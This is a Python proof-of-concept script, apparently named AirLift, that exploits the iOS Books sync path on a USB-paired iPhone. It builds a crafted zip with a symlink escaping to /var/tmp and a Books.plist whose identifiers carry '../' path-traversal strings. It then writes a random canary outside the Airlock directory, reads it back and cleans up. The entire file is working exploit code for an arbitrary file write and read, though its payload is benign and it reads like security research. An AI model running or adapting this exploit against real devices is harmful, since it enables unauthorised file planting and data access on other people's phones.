#!/usr/bin/env python3
"""Independent AirLift demonstration: random canary in /var/tmp, readback, cleanup."""

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import shutil
import stat
import struct
import subprocess
import tempfile
import zipfile
from pathlib import Path


HERE = Path(__file__).resolve().parent
AIRLOCK = "/var/mobile/Media/Airlock/Book"
TARGET = "/var/tmp"


def entry(name: str, mode: int) -> zipfile.ZipInfo:
    item = zipfile.ZipInfo(name)
    item.create_system = 3
    item.compress_type = zipfile.ZIP_STORED
    item.external_attr = mode << 16
    # StreamingZip reads the Unix mode from this Apple extra field.
    item.extra = struct.pack("<HHH", 0x5A53, 2, mode)
    return item


def make_archive(data: bytes) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(entry("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            entry("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY),
        )
        for path in ("a/", "a/b/", "a/b/c/", "var/", "var/tmp/"):
            archive.writestr(entry(path, stat.S_IFDIR | 0o755), b"")
        # Contained during extraction. Moving it to Media changes its base path.
        archive.writestr(entry("a/b/c/jump", stat.S_IFLNK | 0o777), b"../../../var/tmp")
        archive.writestr(entry("payload", stat.S_IFREG | 0o600), data)
    return output.getvalue()


def make_books(identifiers: list[str]) -> bytes:
    return plistlib.dumps(
        {"Books": [
            {"Persistent ID": value, "Item ID": str(index), "DSID": "1"}
            for index, value in enumerate(identifiers, 1)
        ]},
        fmt=plistlib.FMT_BINARY,
    )


def host(mode: str, device: str, *args: str, timeout: int = 50,
         allow_failure: bool = False) -> dict:
    command = [str(HERE / "host"), mode, device, *args]
    completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
    try:
        result = json.loads(completed.stdout.strip())
    except json.JSONDecodeError:
        result = {}
    if not result and mode == "sync":
        for line in reversed(completed.stderr.splitlines()):
            try:
                result = json.loads(line)
                break
            except json.JSONDecodeError:
                pass
    if (completed.returncode != 0 or not result.get("ok")) and not (allow_failure and result):
        detail = completed.stderr.strip() or result.get("error") or "no result"
        raise RuntimeError(f"{mode} failed ({completed.returncode}): {detail}")
    return result


def run(device: str) -> dict:
    if not (HERE / "host").is_file():
        raise RuntimeError("build the independent host first: make -C cleanroom")
    token = secrets.token_hex(10)
    source, link, recovered = (f"cl-src-{token}", f"cl-link-{token}", f"cl-read-{token}")
    leaf = f"cl-canary-{token}.bin"
    canary = f"AirLift cleanroom proof {token} {secrets.token_hex(16)}\n".encode()
    identifiers = [
        f"../../{source}/a/b/c/jump",
        f"../../{source}/payload",
        posixpath.relpath(f"{TARGET}/{leaf}", AIRLOCK),
    ]
    destinations = [link, f"{link}/{leaf}", recovered]

    work = Path(tempfile.mkdtemp(prefix="airlift-cleanroom-"))
    (work / "archive.zip").write_bytes(make_archive(canary))
    (work / "Books.plist").write_bytes(make_books(identifiers))
    (work / "expected.bin").write_bytes(canary)

    preflight = None
    staged = False
    sync_started = False
    sync_result = None
    finish = None
    error = None
    try:
        preflight = host("preflight", device, source, link, recovered)
        host("stage", device, source, link, recovered,
             str(work / "archive.zip"), str(work / "Books.plist"))
        staged = True
        sync_started = True
        sync_args = [item for pair in zip(identifiers, destinations) for item in pair]
        sync_result = host("sync", device, *sync_args, timeout=105)
    except (OSError, RuntimeError, subprocess.TimeoutExpired) as exc:
        error = str(exc)
    finally:
        if preflight is not None:
            try:
                finish = host(
                    "finish", device, source, link, recovered, leaf,
                    str(work / "expected.bin"),
                    str(int(preflight["booksExisted"])),
                    str(int(preflight["syncExisted"])),
                    str(int(preflight["databaseExisted"])),
                    str(int(sync_started)), timeout=65, allow_failure=True,
                )
            except (OSError, RuntimeError, subprocess.TimeoutExpired) as exc:
                error = f"{error}; cleanup: {exc}" if error else f"cleanup: {exc}"

    proven = bool(staged and sync_result and finish and finish.get("bytesMatch"))
    clean = bool(finish and finish.get("cleanupComplete"))
    result = {
        "ok": proven and clean and error is None,
        "device": device,
        "target": f"{TARGET}/{leaf}",
        "canarySHA256": hashlib.sha256(canary).hexdigest(),
        "staged": staged,
        "sync": sync_result,
        "exactBytesRecovered": proven,
        "cleanupComplete": clean,
        "finish": finish,
    }
    if error:
        result["error"] = error
    if clean:
        shutil.rmtree(work)
    else:
        result["recoveryFiles"] = str(work)
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--device", required=True, help="UDID of a paired iPhone on USB")
    args = parser.parse_args()
    try:
        result = run(args.device)
    except Exception as exc:
        result = {"ok": False, "error": str(exc)}
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["ok"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
